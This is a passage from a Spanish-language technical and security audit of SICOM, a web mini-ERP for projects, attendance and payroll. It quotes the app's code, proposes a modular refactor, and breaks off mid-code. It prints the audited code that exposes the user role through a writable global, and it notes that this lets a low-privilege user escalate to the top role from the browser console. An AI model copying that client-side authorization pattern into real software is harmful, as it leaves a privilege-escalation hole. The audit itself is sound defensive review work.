# DICTAMEN DE AUDITORÍA TÉCNICA, ARQUITECTÓNICA, FUNCIONAL Y DE SEGURIDAD 360°
## Sistema Integral de Control Operativo y Multigestión (SICOM)
**Terminal de Operaciones, Portafolio STGT, Asistencia Híbrida & Prenómina FOPR-RHU-02-02**

---

| Metadato de Auditoría | Valor / Detalle de Registro |
|---|---|
| **Proyecto Auditado:** | SICOM (Terminal de Operaciones & Portafolio STGT) |
| **Fecha de Emisión:** | 19 de Octubre de 2026 |
| **Versión del Código Analizado:** | v950 (`app.js?v=20261018_v950`) |
| **Directorio de Trabajo del Proyecto:** | `c:\Users\osvsa\Desktop\SICOM_PROD` |
| **Alcance:** | Arquitectura Frontend, Seguridad/RBAC/Persistencia, Reglas de Negocio/ERP, Responsividad Móvil |
| **Paradigma Tecnológico Restringido:** | 100% Vanilla JavaScript (ES Modules nativos) + Tailwind CSS (sin dependencias invasivas en runtime) |
| **Dictamen de Madurez Global:** | **NIVEL DE RIESGO: CRÍTICO (NO APTO PARA PRODUCCIÓN FINANCIERA/LEGAL SIN REMEDIACIÓN)** |

---

## ÍNDICE GENERAL

1. [Resumen Ejecutivo & Ficha Técnica del Dictamen](#1-resumen-ejecutivo--ficha-técnica-del-dictamen)
   - 1.1 Objeto y Alcance de la Auditoría
   - 1.2 Ficha Técnica del Sistema y Métricas Cuantitativas
   - 1.3 Dictamen Global de Madurez y Nivel de Riesgo Consolidado
   - 1.4 Resumen Ejecutivo de Hallazgos por Dimensión
2. [Eje R1: Evaluación Arquitectónica, Mantenibilidad y Rendimiento Frontend](#2-eje-r1-evaluación-arquitectónica-mantenibilidad-y-rendimiento-frontend)
   - 2.1 Diagnóstico del Monolito `app.js` (Acoplamiento, 275 Variables de Módulo y Contaminación de `window`)
   - 2.2 Manipulación Directa del DOM y Layout Thrashing (Destrucción de `canvasGroup` y Reflows Forzados)
   - 2.3 Lienzo Interactivo SVG (`canvasGroup`): Bucles rAF Concurrentes, Falta de Dirty-Flagging y Fuga de Listeners
   - 2.4 Tailwind CSS, Estilos y Rendimiento Gráfico: Antipatrón Tailwind Play CDN, Reglas `:has()` y Clases Arbitrarias
   - 2.5 Gestión de Memoria, Timers y Ciclos de Vida (`mousemove` no limitado y `setTimeout` huérfanos)
   - 2.6 Propuesta de Arquitectura Modular Limpia (100% Vanilla JS + Tailwind CSS)
3. [Eje R2: Auditoría de Seguridad, Autorización (RBAC) y Persistencia de Datos](#3-eje-r2-auditoría-de-seguridad-autorización-rbac-y-persistencia-de-datos)
   - 3.1 Modelo de Persistencia en LocalStorage y Cuotas (Silenciamiento de QuotaExceededError y DoS Local)
   - 3.2 Integridad de Respaldos JSON y CSV: Inyección de Fórmulas CSV (CWE-1236) y Sobreescritura Destructiva en Nube
   - 3.3 Modelo de Autorización (RBAC) y Escalación de Privilegios en Cliente (Bypass de `window.currentUserRole`)
   - 3.4 Inyección de Código (XSS), Fallas en `escapeHtml` y Ausencia de CSP
   - 3.5 Gestión de Credenciales, Secretos y Autenticación en la Nube (Hashes SHA-256 no salados, VAPID y Webhooks)
4. [Eje R3: Validación de Flujos Operativos y Reglas de Negocio del Mini-ERP](#4-eje-r3-validación-de-flujos-operativos-y-reglas-de-negocio-del-mini-erp)
   - 4.1 Asistencia & Prenómina Quincenal (FOPR-RHU-02-02 Ver. 4)
   - 4.2 Módulo de Gestión de Vacaciones (FOPR-RHU-02-03 Ver. 4) y Reforma LFT de "Vacaciones Dignas"
   - 4.3 Centro de Trabajo, Proyectos y Trazabilidad Operativa
5. [Responsividad Multiplataforma y Rendimiento Móvil](#5-responsividad-multiplataforma-y-rendimiento-móvil)
   - 5.1 Impacto de Selectores `:has()` y Transiciones Universales en Dispositivos Móviles
   - 5.2 Reflows Sincrónicos y Retardo Táctil en Gestos de Paneo y Pellizco
   - 5.3 Sobrecarga de Renderizado por Modales y Drawers Persistentes en el DOM
6. [Matriz Integral de Riesgos y Hallazgos por Severidad](#6-matriz-integral-de-riesgos-y-hallazgos-por-severidad)
7. [Plan de Acción y Ruta de Optimización Priorizada](#7-plan-de-acción-y-ruta-de-optimización-priorizada)
   - 7.1 Fase 1: Acciones Inmediatas ("Quick Wins" - Alto Impacto / Bajo Esfuerzo)
   - 7.2 Fase 2: Mejoras Estructurales a Mediano Plazo
8. [Guía de Verificación Independiente y Reproducibilidad](#8-guía-de-verificación-independiente-y-reproducibilidad)
9. [Dictamen Final y Recomendaciones de Gobernanza](#9-dictamen-final-y-recomendaciones-de-gobernanza)

---

## 1. RESUMEN EJECUTIVO & FICHA TÉCNICA DEL DICTAMEN

### 1.1 Objeto y Alcance de la Auditoría
La presente auditoría exhaustiva 360° tiene como propósito emitir un dictamen técnico, arquitectónico, funcional y pericial sobre el sistema **SICOM** (Sistema Integral de Control Operativo y Multigestión), concebido como una plataforma web tipo "mini-ERP" para la gestión integral de portafolios de proyectos, cálculo de avance documental ponderado, seguimiento de tareas diarias, control de asistencia bajo modalidad híbrida y generación de prenómina quincenal conforme a las especificaciones institucionales de los formatos **FOPR-RHU-02-02 (Versión 4)** y **FOPR-RHU-02-03 (Versión 4)**.

El análisis abarca la totalidad del código fuente alojado en el entorno de desarrollo y producción local (`c:\Users\osvsa\Desktop\SICOM_PROD`), comprendiendo la interfaz de usuario, los motores de persistencia local y sincronización remota con Google Firestore, los endpoints de notificaciones WebPush y las integraciones externas con Google Apps Script y Google Chat.

### 1.2 Ficha Técnica del Sistema y Métricas Cuantitativas

| Componente / Archivo | Tamaño / Líneas | Rol Tecnológico y Descripción |
|---|---|---|
| `app.js` | 12,414 líneas (716.7 KB) | Monolito de control central, renderizado SVG, lógica de negocio y persistencia. |
| `index.html` | 2,371 líneas (208.9 KB / 204 KiB) | Estructura DOM completa, templates de modales, formularios y referencias a CDN. |
| `styles.css` | 1,396 líneas (42.9 KB) | Estilos personalizados "Factory Design System", animaciones y reglas responsive. |
| `prenomina_template.js` | 134.2 KB (1 línea) | Cadena Base64 de la plantilla binaria XLSX oficial (`FOPR-RHU-02-02 Ver. 4`). |
| `api/push.js` | 120 líneas (4.0 KB) | Endpoint serverless Vercel para despacho de notificaciones WebPush. |
| `google_apps_script/Code.gs` | 319 líneas (13.0 KB) | Proxy para Webhooks de Google Chat y sincronización con Firestore. |
| `sw.js` | 88 líneas (2.8 KB) | Service Worker para capacidades Progressive Web App (PWA) y caché estática. |
| `_headers` / `vercel.json` | 13 líneas / 39 líneas | Políticas de seguridad HTTP, rewrites de enrutamiento y cabeceras de red. |

#### Métricas Empíricas Relevantes del Código
- **Variables de ámbito de módulo compartidas:** **275 variables** declaradas entre las líneas 8 y 45 de `app.js` mutadas concurrentemente por cientos de funciones.
- **Asignaciones al objeto global `window.*`:** **332 asignaciones** explícitas para permitir la interoperabilidad con handlers inline.
- **Manipulaciones de innerHTML:** **139 asignaciones directas** (`.innerHTML =`), evidenciando renderizado basado en concatenación de cadenas sin DOM Diffing.
- **Manejadores de eventos inline en `index.html`:** **80+ atributos `onclick="..."`**, `onchange="..."`, forzando un fuerte acoplamiento estructural.
- **Clases CSS arbitrarias con valores hexadecimales:** **1,350+ clases** del tipo `bg-[#101010]`, `text-[#ee6018]`, `border-[#3d3a39]` dispersas en el HTML y JavaScript.
- **Uso de CDN en tiempo de ejecución:** Descarga de `https://cdn.tailwindcss.com` (Tailwind Play CDN JIT) directamente en el cliente.

### 1.3 Dictamen Global de Madurez y Nivel de Riesgo Consolidado

```
+-------------------------------------------------------------------------------+
|                      DICTAMEN GLOBAL DE AUDITORÍA: CRÍTICO                    |
|  El sistema SICOM presenta una interfaz visual rica y de alta densidad de     |
|  información, pero carece de fronteras de seguridad en servidor, contiene      |
|  violaciones graves a la legislación laboral en el cómputo de vacaciones,     |
|  arriesga pérdida de datos catastrófica por desbordamiento de LocalStorage     |
|  y su arquitectura monolítica compromete severamente su escalabilidad.        |
+-------------------------------------------------------------------------------+
```

- **Mantenibilidad Frontend:** **Deficiente (Riesgo Alto)**. Modificaciones menores en una regla de negocio provocan regresiones impredecibles en el lienzo o modales debido al estado global mutado por 275 variables no encapsuladas.
- **Rendimiento Gráfico y Móvil:** **Degradado (Riesgo Alto)**. Destrucción total y recreación del árbol SVG en cada pulsación, bucles de animación concurrentes compitiendo en el hilo principal y forzado continuo de reflujos geométricos (*Layout Thrashing*).
- **Seguridad y Control de Acceso (RBAC):** **Inseguro / Crítico**. La autorización reside 100% en el navegador del cliente; cualquier usuario con perfil "Lector" puede promoverse a "Supremo" mediante una instrucción de 30 caracteres en la consola de DevTools.
- **Integridad y Respaldo de Datos:** **Vulnerable (Riesgo Crítico)**. La importación de respaldos JSON reemplaza la base de datos de producción completa en Firestore sin confirmación ni autenticación criptográfica. LocalStorage silencia fallos de cuota (5 MB).
- **Lógica de Negocio y Nómina:** **Incumplimiento Normativo (Riesgo Crítico)**. Violación flagrante de la reforma de "Vacaciones Dignas" de la Ley Federal del Trabajo (LFT), omisión de días festivos oficiales y cálculo de avance documental distorsionado por ítems no aplicables.

### 1.4 Resumen Ejecutivo de Hallazgos por Dimensión

```
                                  MAPA DE CALOR DE RIESGOS
  ┌─────────────────────────────────────────────────────────────┬─────────────────┐
  │ Dimensión Evaluada                                          │ Nivel de Riesgo │
  ├─────────────────────────────────────────────────────────────┼─────────────────┤
  │ R1. Arquitectura de Software & Mantenibilidad de Código     │      ALTO       │
  │ R1. Rendimiento del Lienzo SVG & Manipulación de DOM        │      ALTO       │
  │ R1. Gestión de Memoria y Ciclos de Vida                     │      MEDIO      │
  │ R2. Control de Acceso (RBAC) & Frontera de Confianza        │     CRÍTICO     │
  │ R2. Integridad de Persistencia & Respaldos (JSON / CSV)     │     CRÍTICO     │
  │ R2. Seguridad de Credenciales & Exposición de Secretos      │     CRÍTICO     │
  │ R2. Prevención de Inyección de Código (XSS) & Cabeceras CSP │      ALTO       │
  │ R3. Cumplimiento de Reforma Laboral LFT (Vacaciones Dignas) │     CRÍTICO     │
  │ R3. Consistencia de Prenómina & Formato FOPR-RHU-02-02      │     CRÍTICO     │
  │ R3. Avance Documental de Proyectos & Integridad de Bitácora │      MEDIO      │
  │ Multiplataforma: Rendimiento Móvil & Layout Thrashing       │      ALTO       │
  └─────────────────────────────────────────────────────────────┴─────────────────┘
```

---

## 2. EJE R1: EVALUACIÓN ARQUITECTÓNICA, MANTENIBILIDAD Y RENDIMIENTO FRONTEND

### 2.1 Diagnóstico del Monolito `app.js` (Acoplamiento, 275 Variables y Contaminación de `window`)

#### Evidencia en el Código Fuente
En `index.html` (línea 2367), el script central se invoca como un módulo ECMAScript:
```html
<!-- index.html: línea 2367 -->
<script type="module" src="app.js?v=20261018_v950"></script>
```
No obstante, al analizar las líneas iniciales de `app.js` (líneas 8 a 45), se constata la definición de un estado mutable global distribuido en **275 variables no encapsuladas**:
```javascript
// app.js: líneas 8-9, 11-21, 31-41
let appId, db, auth, isFirebaseReady = false, unsubscribeSnapshot = null;
let globalDoc, globalSetDoc;
let svgElem, canvasGroup;
let translateX = 0, translateY = 0, scale = 1;
let isPanning = false, startX, startY;
let initialPinchDistance = null;
let isDrawerOpen = false, isPriorityDrawerOpen = false, isDailyDrawerOpen = false, isFilterDrawerOpen = false;
let activeSearchQuery = '';
let activeFilterModule = 'ALL', activeFilterConsultant = 'ALL', activeFilterStatus = 'ALL', activeFilterCompany = 'ALL';
let activeFilterModules = ['ALL'], activeFilterConsultants = ['ALL'], activeFilterStatuses = ['ALL'], activeFilterCompanies = ['ALL'];
let activeFilterUrgency = 'ALL', activeFilterPriority = 'ALL', activeFilterBottleneck = 'ALL', isFocusMode = false, showAllSecondaryLinks = false;
let collapsedModules = new Set();
let knownModuleIds = new Set();
let currentSelection = { type: null, id: null };
let currentCreateType = 'project';
let itemToDelete = { category: null, id: null };
let appData = JSON.parse(JSON.stringify(defaultTestingData));
let consultants = JSON.parse(JSON.stringify(fallbackConsultants));
let globalDocs = [...];
```

#### Contaminación Masiva del Objeto Global
Dado que las especificaciones de ECMAScript aíslan el alcance de las variables de un módulo frente al objeto global `window`, el código puentea deliberadamente esta protección registrando **332 asignaciones a `window.*`**:
```javascript
// app.js: líneas 77, 79-93
window.getAppData = () => appData;
try {
  Object.defineProperty(window, 'appData', {
    get: () => appData,
    set: (v) => { appData = v; },
    configurable: true
  });
  Object.defineProperty(window, 'currentUserRole', {
    get: () => currentUserRole,
    set: (v) => { currentUserRole = v; },
    configurable: true
  });
} catch (_) {
  window.appData = appData;
  window.currentUserRole = currentUserRole;
}
```
Esto anula completamente el propósito de los módulos ES, operando en la práctica como un script procedimental de 12,414 líneas donde el acoplamiento cruzado entre subsistemas (asistencia, renderizado de grafos, tableros de control y persistencia) hace inviable el desarrollo de pruebas unitarias automatizadas y genera un costo prohibitivo de incorporación para nuevos ingenieros.

### 2.2 Manipulación Directa del DOM y Layout Thrashing (Destrucción de `canvasGroup` y Reflows Forzados)

#### Pulverización Destructiva del Árbol SVG
El sistema cuenta con **139 asignaciones directas a `.innerHTML =`**. El caso más severo se localiza en la función de renderizado del mapa mental:
```javascript
// app.js: línea 6360-6363
window.renderMindMap = function() {
  if (!canvasGroup) return; canvasGroup.innerHTML = '';
  const dynamicDefs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
  canvasGroup.appendChild(dynamicDefs);
```
Cada vez que el usuario marca una tarea rápida (línea 8683), añade una nota (línea 1930), acusa lectura de un comentario (líneas 1969, 1997), colapsa un módulo (línea 7618) o aplica un filtro por consultor (líneas 9386, 9802), **la totalidad del subárbol SVG de `canvasGroup` es destruida a cadena vacía** y vuelta a crear desde cero nodo por nodo.

#### Inserción Directa en el Árbol Vivo sin `DocumentFragment`
A lo largo de las 1,400 líneas que componen `renderMindMap`:
```javascript
// app.js: líneas 6769, 6864, 6996, 7417, 7627, 7756
canvasGroup.appendChild(pC);
canvasGroup.appendChild(pP);
canvasGroup.appendChild(pSec);
canvasGroup.appendChild(g);
canvasGroup.appendChild(coreG);
```
Cada llamada a `appendChild` opera directamente sobre el nodo conectado al documento principal, disparando micro-cálculos de geometría y repintado por cada elemento en lugar de construir la escena en un `DocumentFragment` en memoria y adjuntarla atómicamente al final del ciclo.

#### Layout Thrashing (Lectura Forzada de Geometría + Mutación Sincrónica)
Se detectaron múltiples puntos donde se fuerzan ciclos inmediatos de reflow (*Layout Thrashing*):
1. **En la transformación de cámara del lienzo:**
   ```javascript
   // app.js: líneas 2289, 2316
   const rect = svgElem ? svgElem.getBoundingClientRect() : { width: window.innerWidth, height: window.innerHeight };
   canvasGroup.setAttribute('transform', `translate(${translateX}, ${translateY}) scale(${scale})`);
   ```
2. **En el evento de pellizco táctil en dispositivos móviles (`touchmove`):**
   ```javascript
   // app.js: líneas 2443-2444
   if (!svgElem) window.ensureDomReferences();
   const rect = svgElem.getBoundingClientRect(); // Reflow forzado en cada micro-evento táctil (hasta 120 veces por segundo)
   ```
3. **En el arrastre de documentos base (`dragover`):**
   ```javascript
   // app.js: líneas 6062-6066
   window.handleDocDragOver = function(e, idx) {
       const rect = target.getBoundingClientRect(); // Reflow continuo al mover el puntero
       target.classList.add('drag-over-top');
   ```

### 2.3 Lienzo Interactivo SVG (`canvasGroup`): Bucles rAF Concurrentes, Falta de Dirty-Flagging y Fuga de Listeners

#### Naturaleza del Lienzo
El lienzo de operaciones no es un elemento `<canvas>` rasterizado de HTML5, sino un contenedor vectorial SVG interactivo `<g id="canvasGroup">` anidado en `<svg id="mindmapCanvas">` (`index.html: líneas 911-913`).

#### Bucles de Animación Concurrentes y Desincronizados
En la interpolación de curvas de Bézier entre módulos:
```javascript
// app.js: líneas 6780-6791
const stepCorePath = (now) => {
    const t = Math.min(1, (now - animStart) / animDur);
    const ease = 1 - Math.pow(1 - t, 3);
    const v = prevNums.map((p0, i) => p0 + (currNums[i] - p0) * ease);
    pC.setAttribute('d', `M ${v[0]} ${v[1]} C ${v[2]} ${v[3]}, ${v[4]} ${v[5]}, ${v[6]} ${v[7]}`);
    if (t < 1 && pC.isConnected) requestAnimationFrame(stepCorePath);
};
requestAnimationFrame(stepCorePath);
```
Cuando `renderMindMap()` se dispara en ráfaga (por ejemplo, al teclear en el campo de búsqueda rápida de proyectos o cambiar rápidamente entre filtros), se crean múltiples instancias del bucle `stepCorePath` en paralelo. Estas compiten en la cola de frames animando conectores que están siendo desconectados del DOM, desperdiciando ciclos de CPU.

#### Ausencia Total de Marcado de Suciedad ("Dirty-Flagging")
El sistema carece de un mecanismo que identifique qué entidades cambiaron. Si el usuario modifica el porcentaje de avance de un único proyecto, el motor recalcula trigonométricamente la posición angular, radios, conectores y nodos de todos los proyectos de la organización.

#### Fuga de Event Listeners dentro de Bucles SVG
En lugar de emplear el patrón de delegación de eventos en el elemento `<svg>` raíz, el código asocia listeners individuales dentro del bucle de creación:
```javascript
// app.js: líneas 7047-7054 (En CADA nodo de proyecto generado)
g.addEventListener('click', function(e) {
    e.preventDefault();
    e.stopPropagation();
    window.selectNode(currentNodeType, currentNodeId);
}, false);

// app.js: líneas 7058-7078 (En CADA proyecto con enlaces secundarios)
g.addEventListener('mouseenter', function() {
    const conns = canvasGroup.querySelectorAll(`.secondary-module-connector[data-source-proj="${currentNodeId}"]`);
    // manipulación de clases visuales...
});
g.addEventListener('mouseleave', function() { ... });

// app.js: líneas 7476, 7483, 7487 (En CADA nodo de módulo)
g.addEventListener('click', function(e) { ... });
g.addEventListener('mouseenter', function() { ... });
g.addEventListener('mouseleave', function() { ... });

// app.js: línea 7618 (En CADA botón de colapso de módulo)
toggleBtnG.addEventListener('click', function(e) { ... });
```
Cuando se ejecuta `canvasGroup.innerHTML = ''`, los elementos visuales se retiran del árbol, pero los closures asociados a las funciones anónimas de los listeners permanecen retenidos en memoria reteniendo referencias al ámbito léxico (`currentNodeId`, `currentNodeType`). Esto ocasiona retención progresiva de memoria (Memory Creep) y frecuentes pausas de recolección de basura (*Garbage Collection Freezes*).

### 2.4 Tailwind CSS, Estilos y Rendimiento Gráfico: Antipatrón Tailwind Play CDN, Reglas `:has()` y Clases Arbitrarias

#### Antipatrón Crítico: Tailwind Play CDN en Producción
En `index.html` (línea 14):
```html
<!-- index.html: línea 14 -->
<script src="https://cdn.tailwindcss.com"></script>
```
El uso de `https://cdn.tailwindcss.com` está expresamente desaconsejado por Tailwind Labs para entornos operativos:
1. **Incompatibilidad con Operación Fuera de Línea (PWA):** A pesar de contar con `sw.js` y `manifest.json`, si el usuario arranca la aplicación en una conexión inestable o sin red, la máquina virtual JIT de Tailwind no se puede descargar; en consecuencia, **la interfaz se renderiza completamente desprovista de estilos CSS**, inutilizando el sistema.
2. **Sobrecarga de CPU en el Navegador:** El script inyecta un `MutationObserver` global que monitorea cada nodo insertado en el DOM para compilar en tiempo real las clases dinámicas e inyectarlas en una etiqueta `<style>` en el `<head>`, incrementando el tiempo de bloqueo del hilo principal (*Total Blocking Time* - TBT).

#### Duplicación Masiva y Clases con Valores Arbitrarios Hexadecimales
A pesar de contar con variables CSS semánticas en `styles.css` (líneas 7 a 16):
- Se encontraron **280 ocurrencias de `[#101010]`**, **396 ocurrencias de `[#3d3a39]`**, **436 ocurrencias de `[#eeeeee]`** y **245 ocurrencias de `[#ee6018]`** (más de 1,350 clases arbitrarias en el código).
- `styles.css` cuenta con **1,396 líneas** que colisionan con Tailwind (e.g., `.pill-btn`, `.liquid-input`, `.factory-bone-card`, `.liquid-glass`), provocando especificidades encontradas.

#### Impacto de Selectores Universales y `:has()` Globales
En `styles.css` (líneas 81-88):
```css
/* styles.css: líneas 81-88 */
.pill-btn, .sd-item, button:not([disabled]), a, input, select, textarea {
    transition: color 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                background-color 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                border-color 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                stroke 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                opacity 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                transform 0.15s cubic-bezier(0.4, 0, 0.2, 1);
}
```
Este selector aplica 6 propiedades de transición a **todos los elementos interactivos del documento**, provocando un consumo masivo de memoria de composición gráfica en tablas con cientos de celdas (como la matriz quincenal de asistencia).

Adicionalmente, en `styles.css` (líneas 736-766):
```css
/* styles.css: líneas 736-766 */
@media (max-width: 767px), (orientation: landscape) and (max-height: 520px) {
    body.info-card-open #speedDial,
    body:has(#infoCard:not(.hidden)) #speedDial,
    body:has(#dailyDrawer:not(.-translate-x-full)) #btnDailyTasks,
    ... /* 20 selectores dependientes de :has en el elemento body */
```
El empleo de `:has()` anclado directamente en el elemento raíz `body` obliga al motor de estilos de Chromium / WebKit a invalidar el árbol completo de cálculo de estilos cada vez que un modal o drawer cambia de visibilidad.

### 2.5 Gestión de Memoria, Timers y Ciclos de Vida (`mousemove` no limitado y `setTimeout` huérfanos)

#### Listener `mousemove` no Limitado (Unthrottled)
En `app.js` (líneas 1018-1031):
```javascript
// app.js: líneas 1018-1031
let inactivityTimeout;
function resetInactivityTimeout() {
    clearTimeout(inactivityTimeout);
    if (localAuthor) {
        inactivityTimeout = setTimeout(() => {
            logActivity('logout', 'Control de Accesos', 'Cierre de sesión automático por inactividad (10 min)', localAuthor);
            window.saveData(false);
            window.logout();
        }, 600000);
    }
}
['mousemove', 'mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => 
    document.addEventListener(evt, resetInactivityTimeout, {passive: true})
);
```
El evento `mousemove` se detona decenas o cientos de veces por segundo durante el movimiento del cursor o el paneo interactivo sobre el lienzo SVG. Esto provoca continuas cancelaciones y creaciones de timers en la cola del navegador (*Timer Churn*), restando fluidez a la tasa de cuadros por segundo.

#### 60+ `setTimeout` Huérfanos sin Cancelación
Se identificaron más de 60 llamadas a `setTimeout` distribuidas en el código (líneas 2222, 2810, 3913, 9388, 9396, 9759, 9804, 9963) para retrasar transiciones, enfocar campos o renderizar componentes. Ninguno de estos identificadores es almacenado ni cancelado si el usuario cierra el modal o cambia de vista antes de su expiración, resultando en ejecuciones fantasma sobre elementos ya destruidos.

---

### 2.6 Propuesta de Arquitectura Modular Limpia (100% Vanilla JS + Tailwind CSS)

Para satisfacer de forma irrestricta la directriz de **mantener el sistema 100% en Vanilla JS nativo y Tailwind CSS, sin introducir frameworks invasivos (React, Vue, Angular) ni herramientas complejas de bundling en runtime**, se formula el siguiente plan de modularización estructurada basado en **ES Modules (ESM) estándar de la Web**:

#### 2.6.1 Estructura Modular de Directorios ESM
```
c:\Users\osvsa\Desktop\SICOM_PROD\
├── index.html                   # HTML semántico y limpio (~700 líneas, sin modales duplicados)
├── styles.css                   # Hoja de estilos estática compilada con variables CSS
├── sw.js                        # Service Worker con estrategia Cache-First para estáticos
├── assets/                      # Iconografía SVG, imágenes y tipografías
├── vendor/                      # Librerías locales UMD (sin dependencia de CDNs externos)
│   ├── chart.js                 # Chart.js local (distribución UMD)
│   ├── xlsx.full.min.js         # SheetJS local (distribución UMD)
│   ├── jszip.min.js             # JSZip local (distribución UMD)
│   └── prenomina_template.js    # Plantilla binaria base64
└── js/
    ├── main.js                  # Punto de entrada de la aplicación (<script type="module" src="js/main.js">)
    ├── vendor/                  # Shims y adaptadores ESM para librerías UMD locales
    │   ├── xlsx.js              # Envoltura ESM: export const XLSX = window.XLSX; export const JSZip = window.JSZip;
    │   └── chart.js             # Envoltura ESM: export const Chart = window.Chart;
    ├── core/
    │   ├── state.js             # Gestor de estado centralizado con patrón Pub/Sub reactivo (~150 líneas)
    │   ├── storage.js           # Adaptador de persistencia IndexedDB con fallback controlado
    │   ├── firebase.js          # Integración segura con Firebase Auth y Firestore
    │   ├── auth.js              # Control de sesión, token JWT y privilegios encapsulados
    │   └── utils.js             # Saneamiento de cadenas, throttle, debounce y formateo de fechas
    ├── mindmap/
    │   ├── canvas.js            # Motor matemático de coordenadas, paneo, zoom y escala
    │   ├── renderer.js          # Renderizador SVG atómico con DocumentFragment y Dirty-Flagging
    │   ├── connectors.js        # Cálculo geométrico de curvas de Bézier y gradientes
    │   └── events.js            # Delegación de eventos centralizada en el contenedor SVG
    ├── modules/
    │   ├── attendance/          # Módulo de Asistencia & Prenómina (FOPR-RHU-02-02)
    │   │   ├── attendanceService.js
    │   │   ├── attendanceViews.js # Vistas de Matriz Quincenal, Diaria y por Consultor
    │   │   ├── commissions.js     # Modal y gestión de comisiones de trabajo
    │   │   ├── vacations.js       # Motor de vacaciones conforme a la Ley Federal del Trabajo
    │   │   └── prenominaExport.js # Generación binaria y descarga del archivo Excel
    │   ├── projects/            # Seguimiento de Proyectos, Documentos Base y Tareas
    │   │   ├── projectService.js
    │   │   ├── notesForum.js      # Foro técnico y menciones interactivas
    │   │   └── projectDrawer.js   # Panel lateral de detalles y edición
    │   ├── tasks/               # Tareas Diarias y Prioridades
    │   │   └── dailyTasks.js
    │   └── dashboard/           # Métricas, KPIs operativos y gráficas
    │       └── kpiService.js
    └── ui/
        ├── notifications.js     # Sistema de alertas Toast, WebPush y marquesina
        ├── drawers.js           # Controlador genérico accesible de apertura/cierre de paneles
        └── modals.js            # Gestión de modales accesibles con atrapamiento de foco
```

#### 2.6.2 Patrón de Estado Centralizado (Store Reactivo Pub/Sub Liviano)
En sustitución de las 275 variables sueltas y los 332 accesos a `window.*`, se establece un almacén inmutable y observable:

```javascript
// js/core/state.js
class Store {
    constructor(initialState) {
        this._state = Object.freeze({ ...initialState });
        this._listeners = new Map();
    }

    getState() {
        return this._state;
    }

    setState(partialState) {
        const prevState = this._state;
        this._state = Object.freeze({ ...this._state, ...partialState });
        this._notify(prevState, this._state);
    }

    subscribe(key, callback) {
        if (!this._listeners.has(key)) this._listeners.set(key, new Set());
        this._listeners.get(key).add(callback);
        return () => this._listeners.get(key).delete(callback);
    }

    _notify(prev, current) {
        this._listeners.forEach((callbacks, key) => {
            if (prev[key] !== current[key]) {
                callbacks.forEach(cb => cb(current[key], prev[key]));
            }
        });
    }
}

export const store = new Store({
    appData: null,
    activeUser: null,
    currentUserRole: 'Consultor',
    currentSelection: { type: null, id: null },
    activeFilters: { modules: ['ALL'], consultants: ['ALL'], statuses: ['ALL'] },
    isDirty: false
});
```

#### 2.6.3 Estrategia de Coexistencia con Librerías Vendor UMD (SheetJS, JSZip, Chart.js)
Un desafío fundamental al adoptar ES Modules nativos sin empaquetadores (bundlers como Vite, Webpack o Rollup) es la interoperabilidad con librerías de terceros. Los binarios disponibles en `vendor/` (`xlsx.full.min.js`, `jszip.min.js`, `chart.js`) son paquetes compilados bajo el estándar **UMD (Universal Module Definition)**:
1. **Incompatibilidad de Importación Directa:** Los navegadores rechazan `import * as XLSX from '../../vendor/xlsx.full.min.js'` con un error de sintaxis (`SyntaxError: The requested module does not provide an export named...`), dado que las librerías UMD asignan sus interfaces directamente al objeto global `window` (`window.XLSX`, `window.JSZip`, `window.Chart`) y carecen de sentencias `export`.
2. **Estrategia Híbrida de Coexistencia:**
   - *Carga Previa en HTML:* Se mantienen las etiquetas `<script src="vendor/xlsx.full.min.js"></script>` y `<script src="vendor/jszip.min.js"></script>` en `index.html` ubicadas inmediatamente antes del módulo principal `<script type="module" src="js/main.js"></script>`.
   - *Adaptadores Delgados ESM (Shims):* En el directorio `js/vendor/`, se definen shims mínimos (por ejemplo, `js/vendor/xlsx.js` conteniendo: `export const XLSX = window.XLSX; export const JSZip = window.JSZip;`). De este modo, los módulos de la aplicación (como `prenominaExport.js`) realizan importaciones formales estándar (`import { XLSX } from '../../vendor/xlsx.js';`) sin contaminar el código de negocio con referencias globales dispersas.
   - *Ruta hacia Módulos Nativos (.mjs):* Para proyectos que deseen prescindir de scripts previos en el HTML, se documenta la adquisición de las compilaciones ESM oficiales nativas (`.mjs`) provistas por SheetJS y Chart.js.

#### 2.6.4 Regla Arquitectónica Anti-Ciclos y Prevención de Bloqueos por TDZ (Temporal Dead Zone)
En una arquitectura puramente modular basada en ESM sin transpiladores, las dependencias circulares entre vistas y componentes secundarios (por ejemplo, `attendanceViews.js` importando funciones de control de `commissions.js`, y `commissions.js` importando renderizadores de `attendanceViews.js`) provocan bloqueos fatales en tiempo de ejecución:
```
ReferenceError: Cannot access 'X' before initialization
```
Esta excepción se produce por la **Zona Muerta Temporal (TDZ)** inherente a ECMAScript cuando el motor intenta evaluar constantes o funciones importadas de módulos en ciclo que aún no concluyen su fase de vinculación (*linkage*).
- **Regla Arquitectónica Mandatoria:** Queda terminantemente prohibida la importación directa cruzada entre módulos de vista, ventanas modales y paneles laterales (`attendanceViews.js`, `commissions.js`, `vacations.js`, `notesForum.js`, etc.).
- **Desacoplamiento Estricto vía Store / PubSub:** Todos los componentes de interfaz deben interactuar exclusivamente a través del gestor de estado reactivo (`store.js`):
  1. Cuando el usuario registra o modifica una comisión en `commissions.js`, este módulo **no invoca funciones de renderizado de la matriz de asistencia**. Únicamente actualiza el estado central: `store.setState({ commissions: updatedCommissions })`.
  2. El módulo `attendanceViews.js` se suscribe a eventos del store durante su ciclo de montaje: `store.subscribe('commissions', (newList) => renderAttendanceMatrix(newList))`.
  3. Este patrón garantiza un flujo unidireccional de datos, elimina al 100% las dependencias circulares y blinda la aplicación contra excepciones de TDZ en cualquier navegador moderno.

#### 2.6.5 Delegación Centralizada de Eventos y Reconciliación con DocumentFragment
En lugar de registrar listeners dentro de bucles SVG, un único manejador en el elemento raíz despacha las acciones basándose en selectores de datos:

```javascript
// js/mindmap/events.js
export function initCanvasEventDelegation(svgElement, actions) {
    svgElement.addEventListener('click', (e) => {
        const toggleBtn = e.target.closest('[data-action="toggle-module"]');
        if (toggleBtn) {
            e.stopPropagation();
            actions.onToggleModule(toggleBtn.dataset.moduleId);
            return;
        }

        const projectNode = e.target.closest('.mindmap-project-node');
        if (projectNode) {
            e.stopPropagation();
